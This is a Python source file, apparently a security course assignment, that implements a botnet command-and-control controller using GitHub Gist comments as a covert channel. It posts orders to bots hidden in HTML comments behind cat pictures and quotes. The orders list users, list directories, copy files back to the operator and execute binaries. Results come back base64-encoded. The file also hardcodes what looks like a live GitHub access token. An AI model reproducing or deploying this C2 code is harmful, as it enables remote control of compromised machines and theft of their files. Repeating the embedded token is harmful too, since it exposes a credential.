import base64
import random
import re
import time
import uuid
from datetime import datetime

import requests

GIST_ID = "413add15a2e073ee71989820426a6c3a"
AUTH_TOKEN = "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"

GIST_URL = f"https://api.github.com/gists/{GIST_ID}"
DEFAULT_HEADERS = {
    "Accept": "application/vnd.github+json",
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "User-Agent": "bsy-assignment-bot/1.0"
}

received_results = set()

def log(message):
    print(f"[{datetime.now()}] :: {message}")


def check_gist_exists() -> bool:
    log(f"Checking connection to a gist with id '{GIST_ID}'")
    result = requests.get(GIST_URL, headers=DEFAULT_HEADERS)
    if result.status_code == 200:
        return True
    else:
        return False


def check_for_heartbeats():
    # A valid heartbeat is one that has happened within the last 5 minutes
    log("Checking for valid heartbeats")

    comments = requests.get(f"{GIST_URL}/comments")
    if comments.status_code != 200:
        log(f"Failed to pull comments from gist. Status code: {comments.status_code}")
        log(comments.reason)
        return []
    log(f"Retrieved {len(comments.json())} total comments")
    log(comments.json())

    valid_bots = set()
    for comment in comments.json():
        x = re.search(".+BOT HEARTBEAT (?P<bot_id>.+) --.+", comment['body'])

        # check timestamp
        curr_timestamp = time.mktime(time.gmtime())
        comment_timestamp = time.mktime(time.strptime(comment['created_at'], "%Y-%m-%dT%H:%M:%SZ"))
        FIVE_MINS = 300
        if curr_timestamp - comment_timestamp >= FIVE_MINS:
            # log(f"Ignoring comment {comment['id']}: stale")
            continue

        if x is not None:
            bot_id = x.group('bot_id')
            valid_bots.add(bot_id)
    log(f"Found {len(valid_bots)} alive bots")
    return valid_bots


def get_user_command_input():
    user_cmd = input("Enter a command to run on bots (enter ? for a list of commands):")
    if user_cmd == "?":
        print("""Available commands:
- ? - prints this message. Does not send anything to the bots
- w - sends a command to bots to list currently logged-in users. Awaits for replies.
- ls - sends a command to bots to list files in a given directory. Awaits for replies.
- id - sends a command to bots to get id of current user. Awaits for replies.
- cp - sends a command to bots to copy a file from bot to the controller. Requires additional input when selected. Awaits for replies.
- exec - sends a command to execute a binary inside the bot. Requires additional input when selected. Awaits for replies.
- noop - do nothing, simply re-check if any new bots have appeared.
- exit - terminate the controller
        """)
        return {"cmd": "noop", "path": None, "restart-loop": True}
    elif user_cmd == "w":
        return {"cmd": "w", "path": None, "restart-loop": False}
    elif user_cmd == "ls":
        filepath = input("Which path do you want to ls? (Provide a valid unix filepath):")
        return {"cmd": "ls", "path": filepath, "restart-loop": False}
    elif user_cmd == "id":
        return {"cmd": "id", "path": None, "restart-loop": False}
    elif user_cmd == "cp":
        filepath = input("Which file do you want to copy from the bot? (Provide a valid unix filepath):")
        return {"cmd": "cp", "path": filepath, "restart-loop": False}
    elif user_cmd == "exec":
        binpath = input("Which binary do you want to execute? (Provide a valid unix filepath):")
        return {"cmd": "exec", "path": binpath, "restart-loop": False}
    elif user_cmd == "noop":
        return {"cmd": "noop", "path": None, "restart-loop": True}
    elif user_cmd == "exit":
        return {"cmd": "exit", "path": None, "restart-loop": False}
    else:
        log(f"Unknown command provided: '{user_cmd}'. Enter ? to see a list of available commands.")
        return {"cmd": "noop", "path": None, "restart-loop": True}


def send_order(order):
    log(f"Sending a command to the bots: {order}")

    # Prepare a random cat picture
    random_w = random.randint(128, 512)
    random_h = random.randint(128, 512)
    random_cat_picture = f"https://placekitten.com/{random_w}/{random_h}"

    # Prepare a random (hopefully pretentious) quote
    random_quote = requests.get("http://quotable.io/random")
    quote = "Whilst there may not always be wisdom to be given, there is always some to be gained."
    quote_author = "Jimmy"

    if random_quote.status_code == 200:
        quote = random_quote.json()['content']
        quote_author = random_quote.json()['author']

    # Other prep
    order_id = uuid.uuid4()

    comment_body = f"<!--- CONTROLLER ORDER {order['cmd']} PATH {order['path']} ID {order_id} -->\n![a cool cat piucture]({random_cat_picture})\n{quote}\n- {quote_author}"

    post_result = requests.post(f"{GIST_URL}/comments",
                                json={"body": comment_body},
                                headers=DEFAULT_HEADERS)
    if post_result.status_code == 201:
        log("Successfully posted the command to bots, awaiting responses")
    else:
        log(f"Something went wrong when posting the command, gist API status code: {post_result.status_code}")
    return


def receive_results():
    log("Checking for new results")

    comments = requests.get(f"{GIST_URL}/comments")
    if comments.status_code != 200:
        log(f"Failed to pull comments from gist. Status code: {comments.status_code}, reason = {comments.reason}")
        return []
    log(f"Retrieved {len(comments.json())} total comments")
    log(comments.json())

    for comment in comments.json():
        x = re.search(
            ".+BOT RESULT (?P<bot_id>.+) ID (?P<order_id>.+) CMD (?P<order_cmd>.+) VALUE (?P<order_result>.+) --.+",
            comment['body'])
        if x is not None:
            bot_id = x.group('bot_id')
            order_id = x.group('order_id')
            order_cmd = x.group('order_cmd')
            raw_result = x.group('order_result')

            if order_id in received_results:
                log(f"Skipping order {order_id}, already received")
                continue

            decoded_result = base64.b64decode(raw_result)

            log(f"Received result for order:\n\tBot ID = {bot_id}\n\tOrder ID = {order_id}\n\tOrder command: {order_cmd}\n\tValue =\n{decoded_result.decode('utf-8')}")

            # cp is a special situation, write contents to a separate file in that case
            if order_cmd == "cp":
                with open(f"{order_id}.out", 'wb') as output_file:
                    output_file.write(decoded_result)
                    output_file.close()

            received_results.add(order_id)


if __name__ == '__main__':
    log("Initializing a C&C Git Gist controller")

    if not check_gist_exists():
        log(f"Failed to connect to the gist with id '{GIST_ID}': terminating")
        exit(1)

    while True:
        valid_bots = check_for_heartbeats()
        log(f"Currently active bots ({len(valid_bots)}): {valid_bots}")

        command = get_user_command_input()
        if command['restart-loop']:
            receive_results()
            continue
        elif command['cmd'] == "exit":
            log("Terminating the controller")
            exit(0)

        send_order(command)
        receive_results()
